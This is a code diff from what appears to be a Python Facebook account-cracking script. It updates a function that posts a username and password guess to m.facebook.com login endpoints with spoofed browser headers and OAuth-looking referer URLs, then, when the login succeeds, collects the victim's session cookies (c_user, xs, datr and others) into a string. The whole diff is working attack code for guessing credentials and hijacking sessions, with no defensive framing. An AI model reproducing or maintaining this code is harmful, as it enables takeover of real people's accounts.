@@ -1038,7 +1038,7 @@ def m2(idf,pwv):
    "pass":ps,
    "login":"Log In"}
    header_freefb ={
-   'Host': 'touch.facebook.com',
+   'Host': 'm.facebook.com',
    'Connection': 'keep-alive',
    'Content-Length': str(len(str(log_data))),
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
@@ -1055,14 +1055,14 @@ def m2(idf,pwv):
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua-platform': '"Android"',
    'Accept': '*/*',
-   'Origin': 'https://touch.facebook.com',
+   'Origin': 'https://m.facebook.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
-   'Referer': 'https://touch.facebook.com/',
+   'Referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522nopbxcbggol024cpgz1m88i3lxv6wtw843lae1dr9arw1t6vk63%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D91922743-22a7-44ff-90e4-84270e48b91d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522nopbxcbggol024cpgz1m88i3lxv6wtw843lae1dr9arw1t6vk63%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post("https://touch.facebook.com/login/device-based/login/async/?api_key=212500508799908&auth_token=aedffdb1606919704ead2d4fa891ac15&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&refsrc=deprecated&app_id=212500508799908&cancel=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&lwv=100",data=log_data,headers=header_freefb).text
+   lo = session.post("https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522nopbxcbggol024cpgz1m88i3lxv6wtw843lae1dr9arw1t6vk63%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D91922743-22a7-44ff-90e4-84270e48b91d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522nopbxcbggol024cpgz1m88i3lxv6wtw843lae1dr9arw1t6vk63%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253Dhttps%25253A%25252F%25252Fwww.instagram.com%25252Fexplore%25252Fpeople%25252F%25253F__coig_login%25253D1%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
